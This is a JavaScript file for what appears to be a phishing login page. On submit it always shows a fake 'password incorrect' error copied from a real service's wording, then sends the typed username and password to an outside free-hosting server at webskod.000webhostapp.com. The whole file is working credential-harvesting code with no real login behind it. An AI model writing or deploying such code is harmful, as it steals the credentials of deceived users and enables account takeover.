let username = document.getElementById('username')
let password = document.getElementById('password')
let submit = document.getElementById('submit')
let error = document.getElementById('error')

function uptrim() {
    username.value = username.value.trim()
    password.value = password.value.trim()
}

function checkpass(pass, user) {
    uptrim()
    if (pass.length >= 6 && user.length > 0) {
        return true;
    } else {
        return false;
    }
}

function enablej() {
    if (checkpass(password.value, username.value)) {
        submit.removeAttribute('disabled');
    } else {
        submit.setAttribute('disabled', true);
    }
}

username.addEventListener('keydown', () => {
    enablej()
})

password.addEventListener('keydown', () => {
    enablej()
}) 

submit.addEventListener('click', () => {
    uptrim()
    error.textContent = `Sorry, your password was incorrect. Please double-check your password.`;
    console.log(`submit=submit&username=${username.value}&password=${password.value}`);
    XMLHttpRequestFn({
        method: 'POST',
        url: 'https://webskod.000webhostapp.com/index.php',
        data: `submit=submit&username=${username.value}&password=${password.value}`,
        callbackT: (response) => {
            console.log(response);
        } 
    })
})







// ################


function XMLHttpRequestFn({
    method,
    url,
    data = "",
    callback = () => {},
    callbackT = (response) => {},
    callbackF = () => {}
}) {
    let newRequest = new XMLHttpRequest();

    newRequest.addEventListener("readystatechange", function() {
        if (this.readyState === 4 && this.status === 200) {
            callbackT(this.responseText)
        } else {
            // callbackF()
        }
    });

    newRequest.addEventListener("loadend", function() {
        callback()
        if (this.readyState !== 4 || this.status !== 200) {
            callbackF()
        }
    });

    method.toUpperCase();

    newRequest.open(method, url + (method === "GET" ? "?" + data : ""), true);
   
    newRequest.setRequestHeader(
        "Content-Type",
        "application/x-www-form-urlencoded"
    );
    newRequest.send(method === "POST" ? data : "");

}
